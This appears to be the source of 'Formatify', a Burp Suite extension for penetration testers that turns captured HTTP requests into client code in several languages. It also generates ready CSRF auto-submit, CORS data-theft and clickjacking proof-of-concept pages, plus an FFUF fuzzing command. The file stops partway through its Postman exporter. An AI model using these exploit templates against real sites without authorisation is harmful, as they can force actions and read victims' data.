#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Formatify - Burp Suite Extension for HTTP request formating 
Author: Sid Joshi 
Version: 1.4

This extension allows you to convert HTTP requests from Burp Suite into various formats
including JavaScript Fetch, cURL, Python Requests, Go, PowerShell, and more.
"""

from burp import IBurpExtender, ITab, IContextMenuFactory, IHttpRequestResponse, IExtensionStateListener
from javax.swing import JPanel, JButton, JComboBox, JTextArea, JScrollPane, JLabel, BoxLayout, JMenuItem
from javax.swing import JSplitPane, BorderFactory, SwingConstants, JOptionPane, SwingUtilities, JFileChooser
from java.awt import BorderLayout, Dimension, Font, Color, FlowLayout, Toolkit
from javax.swing.border import EmptyBorder
from java.awt.event import ActionListener
from java.awt.datatransfer import StringSelection
from java.util import ArrayList
from java.lang import Runnable, Thread
from java.io import FileWriter, BufferedWriter
import re
import json
import base64
import threading

class ConvertButtonListener(ActionListener):
    def __init__(self, extender):
        self.extender = extender

    def actionPerformed(self, event):
        self.extender.convertRequest()

class ClearButtonListener(ActionListener):
    def __init__(self, extender):
        self.extender = extender

    def actionPerformed(self, event):
        self.extender.clearFields()

class CopyToClipboardListener(ActionListener):
    def __init__(self, extender):
        self.extender = extender

    def actionPerformed(self, event):
        self.extender.copyToClipboard()

class SaveToFileListener(ActionListener):
    def __init__(self, extender):
        self.extender = extender

    def actionPerformed(self, event):
        self.extender.saveToFile()

class BurpExtender(IBurpExtender, ITab, IContextMenuFactory, IExtensionStateListener):
    """
    Main extension class implementing Burp interfaces
    """

    def registerExtenderCallbacks(self, callbacks):
        """
        Extension entry point
        """

        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()

        callbacks.setExtensionName("Formatify")

        self._buildUI()

        callbacks.registerContextMenuFactory(self)

        callbacks.registerExtensionStateListener(self)

        callbacks.addSuiteTab(self)

        self._threads = []

        print("Formatify v1.4 loaded successfully")
        print("Created by Sid Joshi")
        print("Right-click on a request in Repeater or Intruder and select 'Send to Formatify'")

    def extensionUnloaded(self):
        for thread in self._threads:
            if thread.is_alive():
                try:
                    thread.join(1000)  
                except:
                    pass

        print("Formatify unloaded successfully")

    def _buildUI(self):

        self._panel = JPanel(BorderLayout())

        logoPanel = JPanel(BorderLayout())
        logoPanel.setBackground(Color(70, 130, 180))
        logoPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10))

        logoLabel = JLabel("Formatify")
        logoLabel.setFont(Font("SansSerif", Font.BOLD, 24))
        logoLabel.setForeground(Color.WHITE)
        logoLabel.setHorizontalAlignment(SwingConstants.CENTER)

        subtitleLabel = JLabel("HTTP Request Format Converter")
        subtitleLabel.setFont(Font("SansSerif", Font.ITALIC, 14))
        subtitleLabel.setForeground(Color(240, 240, 240))
        subtitleLabel.setHorizontalAlignment(SwingConstants.CENTER)

        textPanel = JPanel(BorderLayout())
        textPanel.setBackground(Color(70, 130, 180))
        textPanel.add(logoLabel, BorderLayout.CENTER)
        textPanel.add(subtitleLabel, BorderLayout.SOUTH)

        logoPanel.add(textPanel, BorderLayout.CENTER)

        splitPane = JSplitPane(JSplitPane.VERTICAL_SPLIT)
        splitPane.setResizeWeight(0.5)
        splitPane.setBorder(EmptyBorder(10, 10, 10, 10))

        topPanel = JPanel(BorderLayout())
        topPanel.setBorder(BorderFactory.createTitledBorder("Formatify - Request Input"))

        self._requestTextArea = JTextArea(10, 100)
        self._requestTextArea.setFont(Font("Monospaced", Font.PLAIN, 13))
        self._requestTextArea.setLineWrap(True)
        requestScrollPane = JScrollPane(self._requestTextArea)

        controlPanel = JPanel()
        controlPanel.setLayout(BoxLayout(controlPanel, BoxLayout.Y_AXIS))
        controlPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10))

        optionsLabelPanel = JPanel(FlowLayout(FlowLayout.CENTER))
        optionsLabel = JLabel("Formatify to:")
        optionsLabel.setFont(Font("SansSerif", Font.BOLD, 14))
        optionsLabelPanel.add(optionsLabel)

        dropdownPanel = JPanel(FlowLayout(FlowLayout.CENTER))
        self._conversionOptions = JComboBox([
            "JavaScript Fetch",
            "cURL Command (Linux)",
            "cURL Command (Windows)",
            "Python Requests",
            "Python aiohttp",
            "Node.js Axios",
            "Go http",
            "PowerShell",
            "FFUF Command",
            "Java OkHttp",
            "CSRF Payload Builder",
            "CORS Exploit PoC",
            "Clickjacking PoC",
            "Postman Collection"
        ])
        self._conversionOptions.setPreferredSize(Dimension(200, 30))
        self._conversionOptions.setFont(Font("SansSerif", Font.PLAIN, 13))
        dropdownPanel.add(self._conversionOptions)

        buttonsPanel = JPanel(FlowLayout(FlowLayout.CENTER))

        convertButton = JButton("Formatify!")
        convertButton.setFont(Font("SansSerif", Font.BOLD, 13))
        convertButton.setPreferredSize(Dimension(120, 35))
        convertButton.addActionListener(ConvertButtonListener(self))

        clearButton = JButton("Clear")
        clearButton.setFont(Font("SansSerif", Font.PLAIN, 13))
        clearButton.setPreferredSize(Dimension(100, 35))
        clearButton.addActionListener(ClearButtonListener(self))

        buttonsPanel.add(convertButton)
        buttonsPanel.add(clearButton)

        controlPanel.add(optionsLabelPanel)
        controlPanel.add(dropdownPanel)
        controlPanel.add(buttonsPanel)

        topPanel.add(requestScrollPane, BorderLayout.CENTER)

        bottomPanel = JPanel(BorderLayout())
        bottomPanel.setBorder(BorderFactory.createTitledBorder("Formatify - Converted Output"))

        self._outputTextArea = JTextArea(10, 100)
        self._outputTextArea.setFont(Font("Monospaced", Font.PLAIN, 13))
        self._outputTextArea.setLineWrap(True)
        self._outputTextArea.setEditable(True)
        outputScrollPane = JScrollPane(self._outputTextArea)

        outputButtonsPanel = JPanel(FlowLayout(FlowLayout.LEFT))

        copyButton = JButton("Copy to Clipboard")
        copyButton.setFont(Font("SansSerif", Font.PLAIN, 12))
        copyButton.setPreferredSize(Dimension(140, 30))
        copyButton.addActionListener(CopyToClipboardListener(self))

        saveButton = JButton("Save to File")
        saveButton.setFont(Font("SansSerif", Font.PLAIN, 12))
        saveButton.setPreferredSize(Dimension(120, 30))
        saveButton.addActionListener(SaveToFileListener(self))

        outputButtonsPanel.add(copyButton)
        outputButtonsPanel.add(saveButton)

        footerPanel = JPanel(FlowLayout(FlowLayout.RIGHT))
        tagline = JLabel("Created with <3 by Sid")
        tagline.setFont(Font("SansSerif", Font.ITALIC, 12))
        tagline.setForeground(Color(100, 100, 100))
        footerPanel.add(tagline)

        bottomControlPanel = JPanel(BorderLayout())
        bottomControlPanel.add(outputButtonsPanel, BorderLayout.WEST)
        bottomControlPanel.add(footerPanel, BorderLayout.EAST)

        bottomPanel.add(outputScrollPane, BorderLayout.CENTER)
        bottomPanel.add(bottomControlPanel, BorderLayout.SOUTH)

        splitPane.setTopComponent(topPanel)
        splitPane.setBottomComponent(bottomPanel)

        self._panel.add(logoPanel, BorderLayout.NORTH)
        self._panel.add(controlPanel, BorderLayout.WEST)
        self._panel.add(splitPane, BorderLayout.CENTER)

    def getTabCaption(self):
        return "Formatify"

    def getUiComponent(self):
        return self._panel

    def createMenuItems(self, invocation):
        menu_items = ArrayList()

        ctx = invocation.getInvocationContext()
        if ctx == invocation.CONTEXT_MESSAGE_EDITOR_REQUEST or ctx == invocation.CONTEXT_MESSAGE_VIEWER_REQUEST:
            selected_messages = invocation.getSelectedMessages()

            if selected_messages and len(selected_messages) == 1:
                menu_item = JMenuItem("Send to Formatify")

                class MenuItemListener(ActionListener):
                    def __init__(self, extender, messages):
                        self.extender = extender
                        self.messages = messages

                    def actionPerformed(self, e):
                        self.extender.sendToConverter(self.messages)

                menu_item.addActionListener(MenuItemListener(self, selected_messages))
                menu_items.add(menu_item)

        return menu_items

    def sendToConverter(self, messages):
        http_message = messages[0]
        request = http_message.getRequest()
        request_str = self._helpers.bytesToString(request)
        self._requestTextArea.setText(request_str)
        
        # Store the protocol and host from the HTTP service
        http_service = http_message.getHttpService()
        self._current_protocol = http_service.getProtocol()
        self._current_host = http_service.getHost()
        self._current_port = http_service.getPort()
        
        parent_frame = SwingUtilities.getWindowAncestor(self._panel)
        if parent_frame is None:
            parent_frame = self._panel

        # JOptionPane.showMessageDialog(parent_frame,
        #                              "Request sent to Formatify tab.\nSelect a conversion format and click Formatify!",
        #                              "Formatify - Request Received",
        #                              JOptionPane.INFORMATION_MESSAGE)

    def clearFields(self):
        self._requestTextArea.setText("")
        self._outputTextArea.setText("")
        # Clear stored protocol info
        if hasattr(self, '_current_protocol'):
            delattr(self, '_current_protocol')
        if hasattr(self, '_current_host'):
            delattr(self, '_current_host')
        if hasattr(self, '_current_port'):
            delattr(self, '_current_port')

    def copyToClipboard(self):
        """
        Copy the content of the output text area to the clipboard
        """
        output_text = self._outputTextArea.getText()
        if not output_text.strip():
            JOptionPane.showMessageDialog(self._panel,
                                         "No content to copy to clipboard.",
                                         "Formatify - Copy to Clipboard",
                                         JOptionPane.INFORMATION_MESSAGE)
            return

        string_selection = StringSelection(output_text)

        clipboard = Toolkit.getDefaultToolkit().getSystemClipboard()

        clipboard.setContents(string_selection, None)

        JOptionPane.showMessageDialog(self._panel,
                                     "Content copied to clipboard successfully!",
                                     "Formatify - Copy to Clipboard",
                                     JOptionPane.INFORMATION_MESSAGE)

    def saveToFile(self):
        """
        Save the content of the output text area to a file
        """
        output_text = self._outputTextArea.getText()
        if not output_text.strip():
            JOptionPane.showMessageDialog(self._panel,
                                         "No content to save to file.",
                                         "Formatify - Save to File",
                                         JOptionPane.INFORMATION_MESSAGE)
            return

        file_chooser = JFileChooser()
        file_chooser.setDialogTitle("Save Formatify Output")

        result = file_chooser.showSaveDialog(self._panel)

        if result == JFileChooser.APPROVE_OPTION:
            selected_file = file_chooser.getSelectedFile()
            file_path = selected_file.getAbsolutePath()

            try:
                writer = BufferedWriter(FileWriter(file_path))
                try:
                    writer.write(output_text)
                finally:
                    writer.close()

                JOptionPane.showMessageDialog(self._panel,
                                             "Content saved to file successfully!\nLocation: " + file_path,
                                             "Formatify - Save to File",
                                             JOptionPane.INFORMATION_MESSAGE)
            except Exception as e:
                JOptionPane.showMessageDialog(self._panel,
                                             "Error saving to file: " + str(e),
                                             "Formatify - Save to File Error",
                                             JOptionPane.ERROR_MESSAGE)

    def convertRequest(self):
        request_str = self._requestTextArea.getText()

        if not request_str.strip():
            self._outputTextArea.setText("Formatify Error: No request provided. Please enter an HTTP request or use 'Send to Formatify' from another Burp tool.")
            return

        self._outputTextArea.setText("Formatify is processing your request...")

        conversion_type = self._conversionOptions.getSelectedItem()

        converter_thread = threading.Thread(
            target=self._process_conversion,
            args=(request_str, conversion_type)
        )
        converter_thread.daemon = True
        self._threads.append(converter_thread)
        converter_thread.start()

    def _process_conversion(self, request_str, conversion_type):
        try:

            if "\r\n\r\n" in request_str:
                headers_str, body = request_str.split("\r\n\r\n", 1)
            else:
                headers_str, body = request_str.split("\n\n", 1)

            headers_lines = headers_str.splitlines()

            request_line = headers_lines[0]
            method, path, _ = request_line.split(" ", 2)

            headers = {}
            for line in headers_lines[1:]:
                if ": " in line:
                    key, value = line.split(": ", 1)
                    headers[key] = value

            # Use stored protocol and host info if available (from context menu), 
            # otherwise fall back to header-based detection
            if hasattr(self, '_current_protocol') and hasattr(self, '_current_host'):
                protocol = self._current_protocol
                host = self._current_host
                # Handle non-standard ports
                if ((protocol == "http" and self._current_port != 80) or 
                    (protocol == "https" and self._current_port != 443)):
                    host = host + ":" + str(self._current_port)
            else:
                # Fallback for manual input - detect from headers
                host = headers.get("Host", "")
                protocol = "https"
                origin = headers.get("Origin", "")
                referer = headers.get("Referer", "")
                if origin.startswith("http://") or referer.startswith("http://"):
                    protocol = "http"
            
            url = protocol + "://" + host + path

            if conversion_type == "JavaScript Fetch":
                result = self._to_javascript_fetch(method, url, headers, body)
            elif conversion_type == "cURL Command (Linux)":
                result = self._to_curl(method, url, headers, body)
            elif conversion_type == "cURL Command (Windows)":
                result = self._to_curl_windows(method, url, headers, body)
            elif conversion_type == "Python Requests":
                result = self._to_python_requests(method, url, headers, body)
            elif conversion_type == "Python aiohttp":
                result = self._to_python_aiohttp(method, url, headers, body)
            elif conversion_type == "Node.js Axios":
                result = self._to_nodejs_axios(method, url, headers, body)
            elif conversion_type == "Go http":
                result = self._to_go_http(method, url, headers, body)
            elif conversion_type == "PowerShell":
                result = self._to_powershell(method, url, headers, body)
            elif conversion_type == "FFUF Command":
                result = self._to_ffuf(method, url, headers, body)
            elif conversion_type == "Java OkHttp":
                result = self._to_java_okhttp(method, url, headers, body)
            elif conversion_type == "CSRF Payload Builder":
                result = self._to_csrf_payload(method, url, headers, body)
            elif conversion_type == "CORS Exploit PoC":
                result = self._to_cors_exploit(method, url, headers, body)
            elif conversion_type == "Clickjacking PoC":
                result = self._to_clickjacking_poc(method, url, headers, body)
            elif conversion_type == "Postman Collection":
                result = self._to_postman_collection(method, url, headers, body)
            else:
                result = "Conversion type not implemented"

            self._update_output(result)

        except Exception as e:
            error_msg = "Formatify Error: " + str(e)
            self._update_output(error_msg + "\n\nPlease ensure the request is properly formatted with headers and body separated by a blank line.")

    def _update_output(self, text):
        class OutputUpdater(Runnable):
            def __init__(self, extender, text):
                self.extender = extender
                self.text = text

            def run(self):
                self.extender._outputTextArea.setText(self.text)

        SwingUtilities.invokeLater(OutputUpdater(self, text))

    def _to_javascript_fetch(self, method, url, headers, body):
        """Convert to JavaScript Fetch API."""
        headers_str = ",\n    ".join(['"' + k + '": "' + v.replace('"', '\\"') + '"' for k, v in headers.items()])

        content_type = headers.get("Content-Type", "")
        if "json" in content_type.lower() and body.strip():
            body_str = json.dumps(body)
        else:
            body_str = json.dumps(body) if body else "null"

        fetch_code = """// JavaScript Fetch API
fetch("%s", {
  method: "%s",
  headers: {
    %s
  },
  body: %s
})
.then(response => {
  if (!response.ok) {
    throw new Error(`HTTP error! Status: ${response.status}`);
  }
  return response.text();
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  console.error('Error:', error);
});
""" % (url, method, headers_str, body_str)
        return fetch_code

    def _to_curl(self, method, url, headers, body):
        """Convert to cURL command."""
        # Build headers with proper escaping and ensure no truncation
        header_lines = []
        for k, v in headers.items():
            # Skip headers that cURL handles automatically
            if k.lower() in ['accept-encoding', 'content-length', 'host']:
                continue
            # Escape quotes and ensure full header value is preserved
            escaped_value = str(v).replace('"', '\\"')
            header_lines.append('-H "' + k + ': ' + escaped_value + '"')
        
        headers_str = " \\\n  ".join(header_lines)

        # Handle request body
        data_str = ""
        if body and body.strip():
            body_content = body.strip().replace("'", "'\"'\"'")  # Escape single quotes for shell
            data_str = " \\\n  --data-raw '%s'" % body_content

        # Build the complete cURL command with proper response handling
        curl_cmd = """curl -L --max-time 30 --connect-timeout 10 \\
  -X %s \\
  %s%s \\
  "%s"
""" % (method, headers_str, data_str, url)

        return curl_cmd

    def _to_curl_windows(self, method, url, headers, body):
        """Generate a Windows CMD-friendly cURL command (caret continuations, double quotes)."""
        header_lines = []
        for k, v in headers.items():
            if k.lower() in ['accept-encoding', 'content-length', 'host']:
                continue
            escaped_value = str(v).replace('"', '""')
            header_lines.append('-H "' + k + ': ' + escaped_value + '"')

        # Join headers with Windows continuation (caret at end of line)
        headers_str = " ^\n  ".join(header_lines)

        data_str = ""
        if body and body.strip():
            # For CMD, prefer --data-raw with double-quoted string; escape internal quotes by doubling them
            escaped_body = body.strip().replace('"', '""')
            data_str = " ^\n  --data-raw \"%s\"" % escaped_body

        curl_cmd = "curl -L --max-time 30 --connect-timeout 10 ^\n  -X %s ^\n  %s%s ^\n  \"%s\"" % (method, headers_str, data_str, url)

        return curl_cmd

    def _to_python_requests(self, method, url, headers, body):
        """Convert to Python Requests."""
        headers_str = ",\n    ".join(['"' + k + '": "' + v.replace('"', '\\"') + '"' for k, v in headers.items()])

        content_type = headers.get("Content-Type", "")
        if body and body.strip():
            if "json" in content_type.lower():

                try:

                    json_obj = json.loads(body)
                    body_param = "json=" + json.dumps(json_obj, indent=4)
                except:

                    body_param = "data='''" + body + "'''"
            else:

                body_param = "data='''" + body + "'''"
        else:
            body_param = ""

        python_code = """# Python Requests
import requests

url = "%s"
headers = {
    %s
}

response = requests.%s(
    url, 
    headers=headers,
    %s
)

print("Status Code: " + str(response.status_code))
print(response.text)
""" % (url, headers_str, method.lower(), body_param)
        return python_code

    def _to_python_aiohttp(self, method, url, headers, body):
        """Convert to Python aiohttp."""
        headers_str = ",\n        ".join(['"' + k + '": "' + v.replace('"', '\\"') + '"' for k, v in headers.items()])

        content_type = headers.get("Content-Type", "")
        if body and body.strip():
            if "json" in content_type.lower():

                try:

                    json_obj = json.loads(body)
                    body_param = "json=" + json.dumps(json_obj, indent=4)
                except:

                    body_param = "data='''" + body + "'''"
            else:

                body_param = "data='''" + body + "'''"
        else:
            body_param = ""

        aiohttp_code = """# Python aiohttp
import aiohttp
import asyncio

async def main():
    url = "%s"
    headers = {
        %s
    }

    async with aiohttp.ClientSession() as session:
        async with session.%s(url, headers=headers, %s) as response:
            print("Status:", response.status)
            print(await response.text())

asyncio.run(main())
""" % (url, headers_str, method.lower(), body_param)
        return aiohttp_code

    def _to_nodejs_axios(self, method, url, headers, body):
        """Convert to Node.js Axios."""
        headers_str = ",\n    ".join(['"' + k + '": "' + v.replace('"', '\\"') + '"' for k, v in headers.items()])

        content_type = headers.get("Content-Type", "")
        if body and body.strip():
            if "json" in content_type.lower():

                try:
                    json_obj = json.loads(body)
                    body_str = json.dumps(json_obj, indent=2)
                except:
                    body_str = body
            else:
                body_str = body
        else:
            body_str = "null"

        axios_code = """// Node.js Axios
const axios = require('axios');

const config = {
  method: '%s',
  url: '%s',
  headers: {
    %s
  },
  data: %s
};

axios(config)
  .then(response => {
    console.log('Status:', response.status);
    console.log('Headers:', JSON.stringify(response.headers));
    console.log('Data:', JSON.stringify(response.data));
  })
  .catch(error => {
    console.error('Error:', error);
  });
""" % (method.lower(), url, headers_str, body_str)
        return axios_code

    def _to_go_http(self, method, url, headers, body):
        """Convert to Go http package."""
        headers_str = "\n\t".join(['req.Header.Add("' + k + '", "' + v.replace('"', '\\"') + '")' for k, v in headers.items()])

        if body and body.strip():
            body_str = """
	// Create request body
	bodyStr := `%s`
	bodyReader := strings.NewReader(bodyStr)

	// Create request
	req, err := http.NewRequest("%s", "%s", bodyReader)""" % (body.strip(), method, url)
        else:
            body_str = """
	// Create request without body
	req, err := http.NewRequest("%s", "%s", nil)""" % (method, url)

        go_code = """// Go http package
package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

func main() {%s
	if err != nil {
		fmt.Printf("Error creating request: %%s\\n", err)
		return
	}

	// Add headers
	%s

	// Create HTTP client
	client := &http.Client{}

	// Send request
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("Error sending request: %%s\\n", err)
		return
	}
	defer resp.Body.Close()

	// Read response
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("Error reading response: %%s\\n", err)
		return
	}

	// Print response
	fmt.Printf("Status: %%s\\n", resp.Status)
	fmt.Printf("Response: %%s\\n", string(body))
}
""" % (body_str, headers_str)
        return go_code

    def _to_powershell(self, method, url, headers, body):
        """Convert to PowerShell."""
        headers_str = "\n".join(['$headers.Add("' + k + '", "' + v.replace('"', '\\"') + '")' for k, v in headers.items()])

        if body and body.strip():
            escaped_body = body.strip().replace('"', '`"')
            body_str = '$body = @"\n' + escaped_body + '\n"@\n'
        else:
            body_str = ""

        powershell_code = """$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
%s

%s

$response = Invoke-WebRequest -Uri "%s" -Method %s %s

Write-Host "Status: $($response.StatusCode)"
Write-Host "Response:"
Write-Host $response.Content
""" % (headers_str, body_str, url, method, "-Body $body" if body and body.strip() else "")
        return powershell_code

    def _to_ffuf(self, method, url, headers, body):
        """Convert to FFUF command for fuzzing."""
        # Create fuzz URL - add FUZZ parameter intelligently
        if "?" in url:
            fuzz_url = url + "&FUZZ=1"  # Add as additional parameter
        else:
            fuzz_url = url + "?FUZZ=1"  # Add as first parameter
        
        # Skip problematic headers like cURL
        header_lines = []
        for k, v in headers.items():
            if k.lower() in ['accept-encoding', 'content-length', 'host']:
                continue
            escaped_value = str(v).replace('"', '\\"')
            header_lines.append('-H "' + k + ': ' + escaped_value + '"')
        
        headers_str = " \\\n  ".join(header_lines)

        # Handle request body with fuzzing
        data_str = ""
        if body and body.strip():
            # Add FUZZ to body for parameter fuzzing
            if "=" in body:
                body_content = body.strip() + "&FUZZ=1"
            else:
                body_content = body.strip()
            body_content = body_content.replace("'", "'\"'\"'")
            data_str = " \\\n  --data '%s'" % body_content

        # Build FFUF command with common options
        ffuf_cmd = """ffuf -w /path/to/wordlist.txt \\
  -u "%s" \\
  -X %s \\
  %s%s \\
  -c \\
  -v
""" % (fuzz_url, method, headers_str, data_str)
        
        return ffuf_cmd

    def _to_java_okhttp(self, method, url, headers, body):
        """Convert to Java OkHttp."""
        headers_str = "\n        ".join(['.addHeader("' + k + '", "' + v.replace('"', '\\"') + '")' for k, v in headers.items()])

        content_type = headers.get("Content-Type", "text/plain")

        if body and body.strip():
            escaped_body = body.replace('"', '\\"').replace('\n', '\\n').replace('\r', '\\r')
            body_code = """        MediaType mediaType = MediaType.parse("%s");
        RequestBody body = RequestBody.create(mediaType, "%s");""" % (content_type, escaped_body)
        else:
            body_code = "        RequestBody body = null;"

        java_code = """// Java OkHttp
import okhttp3.*;
import java.io.IOException;

public class HttpRequest {
    public static void main(String[] args) throws IOException {
        OkHttpClient client = new OkHttpClient();

%s

        Request request = new Request.Builder()
        .url("%s")
        .method("%s", body)
%s
        .build();

        try (Response response = client.newCall(request).execute()) {
            if (!response.isSuccessful()) throw new IOException("Unexpected code " + response);
            System.out.println(response.body().string());
        }
    }
}
""" % (body_code, url, method, headers_str)
        return java_code

    def _to_csrf_payload(self, method, url, headers, body):
        """Create a CSRF payload."""
        form_fields = ""
        content_type = headers.get("Content-Type", "")

        if body and body.strip():
            if "application/x-www-form-urlencoded" in content_type:
                # Parse URL-encoded form data
                try:
                    params = body.split("&")
                    for param in params:
                        if "=" in param:
                            name, value = param.split("=", 1)
                            # HTML escape the values to prevent XSS
                            escaped_name = name.replace('"', '&quot;').replace('<', '&lt;').replace('>', '&gt;')
                            escaped_value = value.replace('"', '&quot;').replace('<', '&lt;').replace('>', '&gt;')
                            form_fields += '    <input type="hidden" name="' + escaped_name + '" value="' + escaped_value + '">\n'
                except:
                    escaped_body = body.replace('"', '&quot;').replace('<', '&lt;').replace('>', '&gt;')
                    form_fields = '    <input type="hidden" name="data" value="' + escaped_body + '">\n'
            elif "application/json" in content_type:
                # For JSON, we need to send via JavaScript since forms can't send JSON directly
                escaped_json = body.replace("'", "\\'").replace('"', '\\"')
                form_fields = '    <!-- JSON payload will be sent via JavaScript -->\n'
                form_fields += '    <script>var jsonData = \'' + escaped_json + '\';</script>\n'
            else:
                # Other content types - escape HTML
                escaped_body = body.replace('"', '&quot;').replace('<', '&lt;').replace('>', '&gt;')
                form_fields = '    <input type="hidden" name="data" value="' + escaped_body + '">\n'

        csrf_html = """<!-- CSRF Payload by Formatify-->
<html>
<head>
    <title>CSRF Exploit</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; text-align: center; }
        h1 { color: #d9534f; }
        form { margin: 20px auto; padding: 20px; max-width: 500px; border: 1px solid #ccc; }
        input[type="submit"] { 
            background-color: #d9534f; 
            color: white;
            padding: 10px 20px; 
            border: none;
            border-radius: 5px; 
            cursor: pointer; 
        }
        input[type="submit"]:hover { background-color: #c9302c; }
    </style>
</head>
<body>
    <h1>CSRF Exploit</h1>
    <p>This form will be submitted automatically when the page loads.</p>

    <form action="%s" method="%s" id="csrf-form">
%s
        <input type="submit" value="Submit Request">
    </form>

    <script>
        // Automatically submit the form when the page loads
        window.onload = function() {
            document.getElementById("csrf-form").submit();
        };
    </script>
</body>
</html>
""" % (url, method.lower(), form_fields)
        return csrf_html

    def _to_cors_exploit(self, method, url, headers, body):
        """Create a CORS exploit proof of concept."""
        # Build headers for the request
        request_headers = {}
        for k, v in headers.items():
            if k.lower() not in ['host', 'origin', 'referer']:
                request_headers[k] = v
        
        # Prepare headers for JavaScript
        headers_js = ""
        if request_headers:
            headers_js = ",\n                ".join(['"' + k + '": "' + v.replace('"', '\\"') + '"' for k, v in request_headers.items()])
            headers_js = ',\n                headers: {\n                    ' + headers_js + '\n                }'
        
        # Prepare body for JavaScript
        body_js = ""
        if body and body.strip():
            escaped_body = body.replace('"', '\\"').replace('\n', '\\n')
            body_js = ',\n                body: "' + escaped_body + '"'

        cors_html = """<!-- CORS Vulnerability Proof of Concept by Formatify-->
<html>
<head>
    <title>CORS Vulnerability PoC</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        h1 { color: #f0ad4e; }
        pre { 
            background-color: #f5f5f5; 
            padding: 10px; 
            border-radius: 5px; 
            overflow-x: auto; 
        }
        button { 
            background-color: #f0ad4e; 
            color: white;
            border: none;
            padding: 10px 20px; 
            border-radius: 5px; 
            cursor: pointer; 
            font-size: 16px;
        }
        button:hover { background-color: #ec971f; }
        #output { 
            margin-top: 20px; 
            padding: 10px; 
            border: 1px solid #ddd; 
            border-radius: 5px; 
        }
    </style>
</head>
<body>
    <h1>CORS Vulnerability Proof of Concept</h1>
    <p>This page attempts to exploit a CORS misconfiguration by making a cross-origin request to: <strong>%s</strong></p>

    <button onclick="testCORS()">Test CORS Vulnerability</button>

    <div id="output">Results will appear here...</div>

    <script>
        function testCORS() {
            const outputDiv = document.getElementById('output');
            outputDiv.innerHTML = "Testing CORS vulnerability...";

            // Make the cross-origin request with actual headers and body
            fetch("%s", {
                method: "%s",
                credentials: "include",  // Send cookies if available
                mode: "cors"%s%s
            })
            .then(response => {
                outputDiv.innerHTML += "<br>Response received! Status: " + response.status;
                return response.text();
            })
            .then(data => {
                console.log(data);
                outputDiv.innerHTML = 
                    "<h3>CORS Vulnerability Confirmed!</h3>" +
                    "<p>The application responded to the cross-origin request and shared sensitive data.</p>" +
                    "<h4>Response Data:</h4>" +
                    "<pre>" + escapeHtml(data.substring(0, 1000)) + (data.length > 1000 ? "..." : "") + "</pre>";
            })
            .catch(error => {
                outputDiv.innerHTML = 
                    "<h3>CORS is properly protected or an error occurred</h3>" +
                    "<p>Error message: " + error + "</p>" +
                    "<p>This could mean either:</p>" +
                    "<ul>" +
                    "<li>The application correctly implements CORS protections</li>" +
                    "<li>The request failed for another reason (check browser console)</li>" +
                    "</ul>";
            });
        }

        function escapeHtml(unsafe) {
            return unsafe
                .replace(/&/g, "&amp;")
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;")
                .replace(/"/g, "&quot;")
                .replace(/'/g, "&#039;");
        }
    </script>
</body>
</html>
""" % (url, url, method, headers_js, body_js)
        return cors_html

    def _to_clickjacking_poc(self, method, url, headers, body):
        """Create a Clickjacking proof of concept."""
        clickjack_html = """<!-- Clickjacking PoC by Formatify -->
<html>
<head>
    <title>Clickjacking PoC</title>
    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; frame-ancestors *;">
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        h1 { color: #5bc0de; }
        .container { position: relative; width: 100%%; max-width: 1200px; margin: 0 auto; }
        .note { margin: 10px 0 20px; color: #555; }
        .frame-wrap { position: relative; width: 100%%; height: 800px; border: 1px solid #ccc; overflow: hidden; }
        /* The victim site */
        iframe#victim {
            width: 1200px; /* adjust to align target control under the lure */
            height: 1200px;
            border: 0;
            opacity: 0.1; /* make it nearly invisible to simulate clickjacking */
            position: absolute;
            top: 0;
            left: 0;
            pointer-events: auto; /* allow clicks to pass to the iframe */
        }
        /* The lure button positioned above (visible) */
        .lure {
            position: absolute;
            top: 150px; /* adjust to align over target button/link */
            left: 200px;
            z-index: 1000;
            background: #5bc0de;
            color: #fff;
            border: none;
            padding: 12px 18px;
            border-radius: 6px;
            cursor: pointer;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
        }
        .lure:hover { background: #31b0d5; }
        .tips { font-size: 14px; color: #777; margin-top: 10px; }
        .warn { color: #d9534f; }
    </style>
</head>
<body>
    <h1>Clickjacking Proof of Concept</h1>
    <div class="note">
        This PoC overlays a nearly transparent iframe pointing to <strong>%s</strong> beneath a visible lure button.
        If the site is vulnerable (no X-Frame-Options and frame-ancestors not set), clicking the button will actually click
        the underlying control in the framed site.
    </div>

    <div class="container">
        <div class="frame-wrap">
            <button class="lure" onclick="alert('If the underlying control is aligned, your click also hit the hidden frame. Adjust offsets to demonstrate.')">Claim Your Prize</button>
            <iframe id="victim" src="%s"></iframe>
        </div>
        <div class="tips">
            Tip: Adjust the iframe size and the lure button position (top/left) to align over a sensitive action (e.g., Delete, Transfer, Approve).
            <br>
            <span class="warn">If the frame is blocked (blank or console shows frame-ancestors / X-Frame-Options), the application may not be vulnerable.</span>
        </div>
    </div>
</body>
</html>
""" % (url, url)
        return clickjack_html

    def _to_postman_collection(self, method, url, headers, body):
        """Generate a Postman Collection JSON for the current request."""
        # Build headers array for Postman
        pm_headers = []
        for k, v in headers.items():
            # Skip headers that are auto-managed by clients
            if k.lower() in ['content-length']:
                continue
            pm_headers.append({
                "key": k,
                "value": v
            })

        # Determine body mode
        content_type = headers.get("Content-Type", "")
        body_obj = None
        if body and body.strip():
            if "application/json" in content_type.lower():
                body_obj = {
                    "mode": "raw",
                    "raw": body,
                    "options": {"raw": {"language": "json"}}
                }
            elif "application/x-www-form-urlencoded" in content_type.lower():
                try:
                    form_params = []
                    for part in body.split("&"):
                        if "=" in part:
                            name, value = part.split("=", 1)
                        else:
                            name, value = part, ""
                        form_params.append({"key": name, "value": value, "type": "text"})
                    body_obj = {"mode": "urlencoded", "urlencoded": form_params}
